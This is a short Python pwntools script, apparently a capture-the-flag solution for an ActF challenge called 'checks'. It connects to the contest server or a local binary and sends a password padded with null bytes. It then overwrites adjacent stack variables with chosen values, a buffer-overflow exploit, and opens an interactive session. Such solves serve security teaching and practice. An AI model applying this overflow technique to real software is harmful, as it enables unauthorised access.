#!/usr/bin/python3

from pwn import *
import sys

if len(sys.argv) > 1:
    r = remote('shell.actf.co', 21303)
else:
    r = process('./checks')

r.sendline(b'password123'.ljust(0x60-0x14, b'\x00') + p32(0x11) + p32(0x3D) + p32(0xf5) + p32(0x37) + p32(0x32))
r.interactive()

